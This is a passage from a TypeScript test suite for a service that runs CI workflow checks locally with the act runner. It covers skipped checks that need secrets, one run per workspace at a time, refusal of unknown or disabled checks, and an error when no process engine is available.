    expect(done.results[2]!.detail).toMatch(/secrets \(NPM_TOKEN\)/);
    expect(done.results[3]!.detail).toMatch(/not triggered by "pull_request"/);
    expect(done.status).toBe('INCOMPLETE');
    expect(executor.executions).toHaveLength(0);

    tools.act = true;
    const second = await service.start({
      workspaceId: workspace.id,
      profileId: null,
      checkIds: ['test'],
      authorizations: [],
    });
    const passed = await finished(service, second.id);
    expect(passed.results[0]).toMatchObject({ status: 'PASSED', method: 'LOCAL_ACT' });
    expect(passed.results[0]!.environment).toBe('Local act runner (act 0.2.80, Docker 28.1.1)');
    expect(executor.executions[0]!.invocation).toMatchObject({ kind: 'act', job: 'test' });
  });

  it('runs one run per workspace and refuses unknown selections', async () => {
    const { service, workspace, repository } = await configured({
      checks: [check({ id: 'a' }), check({ id: 'off', enabled: false })],
      profiles: [],
    });
    const plan = await service.plan({
      workspaceId: workspace.id,
      profileId: null,
      checkIds: ['a', 'off'],
    });
    expect(plan.disabled).toEqual(['off']);
    await repository.authorize(workspace.id, 'a', plan.checks[0]!.digest);
    const input = {
      workspaceId: workspace.id,
      profileId: null,
      checkIds: ['a'],
      authorizations: [],
    };
    const [first, second] = await Promise.allSettled([service.start(input), service.start(input)]);
    expect(first.status).toBe('fulfilled');
    expect(second).toMatchObject({ status: 'rejected', reason: { code: 'PREFLIGHT_BUSY' } });
    await finished(service, (first as PromiseFulfilledResult<PreflightRun>).value.id);
    await expect(
      service.plan({ workspaceId: workspace.id, profileId: null, checkIds: ['ghost'] }),
    ).rejects.toMatchObject({ code: 'PREFLIGHT_NOT_FOUND' });
    await expect(
      service.plan({ workspaceId: workspace.id, profileId: null, checkIds: ['off'] }),
    ).rejects.toMatchObject({ code: 'VALIDATION_FAILED' });
    await expect(
      service.plan({ workspaceId: workspace.id, profileId: 'p', checkIds: ['a'] }),
    ).rejects.toBeInstanceOf(AtlasError);
  });

  it('refuses to run where it does not own processes', async () => {
    const { service } = setup({}, false);
    const workspace = await service.openProject('p1');
    await service.saveConfig(workspace.id, { checks: [check({ id: 'a' })], profiles: [] });
    await expect(
      service.start({
        workspaceId: workspace.id,
        profileId: null,
        checkIds: ['a'],
        authorizations: [],
      }),
    ).rejects.toMatchObject({ code: 'ENGINE_UNAVAILABLE' });
  });
});
